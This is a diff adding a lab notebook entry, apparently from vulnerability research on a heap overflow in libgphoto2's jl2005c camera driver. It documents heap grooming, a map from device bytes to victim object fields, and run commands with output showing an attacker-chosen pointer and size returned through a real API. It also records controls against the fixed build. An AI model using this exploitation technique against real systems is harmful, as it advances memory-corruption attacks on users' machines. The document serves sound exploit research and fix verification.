@@ -1,0 +1,101 @@
+# W170 (2026-11-24): device-chosen pointer survives the real heap write
+#
+# Question W166/W168 left open: the :154 memmove writes 464 bytes past
+# camera->pl. Is there a live real-libgphoto2 object immediately after that
+# allocation whose fields can be steered by device bytes and then read back
+# through a real libgphoto2 API? W168's outside grooming failed because
+# camera_init's allocation did not reuse the prepared hole. W170 instead
+# allocates the victim inside the lab vusb port's bulk-read hook, after
+# camera->pl exists, and drains 24 same-size tcache entries so the victim
+# lands in the free chunk immediately after camera->pl.
+#
+# Real: unmodified libgphoto2 2.5.34 jl2005c camlib, camera_init,
+# jl2005c_init, gp_port_read, memmove, glibc allocator, CameraFile struct
+# and gp_file_get_data_and_size() from the installed libgphoto2.
+# Synthetic: the USB device (lab vusb patch), the heap grooming inside the
+# device hook, the process canary and saved RIP supplied by the local probe.
+# No physical USB, wire, socket, network, external process or command.
+
+## Build (all paths relative to the repository root)
+# Plain build tree src/libgphoto2-2.5.34-plain was configured with
+# CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' and the committed
+# live/vusb-jl2005.patch applied. Local-only extra vusb modes are preserved
+# as evidence/replay-vusb-victim.patch (apply on top of the committed patch);
+# the driver source is evidence/replay-victim_probe.c.
+#
+#   cd lab/frontier/libgphoto2shell/src/libgphoto2-2.5.34-plain
+#   make -C libgphoto2_port && make -C libgphoto2_port install
+#   P=$PWD/installdir-plain
+#   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
+#     -o ../../live/victim_probe ../../live/victim_probe.c \
+#     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
+#
+# Env for every run (P as above):
+#   CAMLIBS=$P/lib/libgphoto2/2.5.34
+#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
+#   LD_LIBRARY_PATH=$P/lib
+#   port usb:001,001
+#
+# gdb at jl2005c_init entry with the drain=24 shape:
+#   priv      = 0x555555563c80
+#   victim    = 0x555555567cd0            (priv + 0x4050, first chunk after)
+# The :154 destination is priv+64 (table); the overflow starts at
+# priv+0x4040 and reaches the victim's data at priv+0x4050. Device bulk
+# offset B therefore maps to victim offset B-0x3E40:
+#   accesstype (+0x150) <- bulk 0x3F90
+#   size       (+0x158) <- bulk 0x3F98
+#   data       (+0x160) <- bulk 0x3FA0
+# The probe exports m2s_victim_file, which the patched port locates with
+# dlsym(RTLD_DEFAULT,...); it also exports finish() and sets its address as
+# the reply's saved RIP and its own %fs:0x28 value as the reply's canary.
+
+## Attack: device-chosen pointer and size returned by a real API
+$ env ... M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1022 \
+    M2SHELL_VUSB_DRAIN=24 M2SHELL_VUSB_ACCESSTYPE=0 \
+    M2SHELL_VUSB_SIZE=0x1a2b3c4d M2SHELL_VUSB_DATA=0x1122334455667788 \
+    ./victim_probe usb:001,001
+VUSB_VICTIM 0x56132d7d2cd0
+VUSB_VICTIM_MODE fill=41 n=16384
+VICTIM_ARRIVED 0x56132d7d2cd0
+VICTIM+140 = 0x4141414141414141
+VICTIM+148 = 0x4141414141414141
+VICTIM+150 = 0x0000000000000000          # chosen accesstype = MEMORY
+VICTIM+158 = 0x000000001a2b3c4d          # chosen size
+VICTIM+160 = 0x1122334455667788          # chosen data pointer
+VICTIM+168 = 0x4141414141414141
+GP_FILE_GET rc=0 data=0x1122334455667788 size=0x1a2b3c4d
+
+Repeated after the fixed-build control was reversed and the vulnerable
+camlib rebuilt: same chosen pointer and size (VICTIM_ARRIVED on a new ASLR
+address). The chosen pointer is never dereferenced; gp_file_get_data_and_size
+only returns it.
+
+## Controls
+count=100, same mode and overrides:
+    GP_CAMERA_INIT rc=0 (no RIP diversion)
+    no VUSB_VICTIM, no VICTIM_ARRIVED, no GP_FILE_GET line
+wrong canary (M2SHELL_JL2005_CANARY=0xdeadbeefdeadbeef), count 1022:
+    *** stack smashing detected ***: terminated   (no diversion)
+safe fill (M2SHELL_JL2005_FILL=0x00, count 1022, no field overrides):
+    VICTIM+150 = 0x0000000000000000
+    VICTIM+158 = 0x0000000000000000
+    VICTIM+160 = 0x0000000000000000
+    GP_FILE_GET rc=0 data=(nil) size=0x0
+fixed-source control (pins/fix-6a3393d.patch applied to the local plain
+tree, `make -C camlibs`, rebuilt jl2005c.so copied into installdir, rerun):
+    GP_CAMERA_INIT rc=0 (no RIP diversion)
+    no VUSB_VICTIM, no VICTIM_ARRIVED, no GP_FILE_GET line
+    fix then reversed and rebuilt; attack again returns the chosen values.
+The fix makes jl2005c_init reject both oversized sizes before the read, so
+the port never sees the bulk request and allocates no victim.
+
+## Disposition
+Rung 4 now includes a device-chosen pointer and length returned by a real
+libgphoto2 API from a live real-build process, with vulnerable, fixed,
+safe-input, count-100 and wrong-canary controls. This closes W168's
+"no live heap neighbour" result for the specific drain=24 layout. It does
+NOT establish rung 5: the canary and saved RIP come from the local probe,
+the victim allocation and placement are lab hooks, the chosen pointer is
+not dereferenced, no benign command runs, and no wire, physical USB or
+independent witness replay exists. Grade stays: local rung 4 at the real
+heap/API scope; rung 5 UNKNOWN.
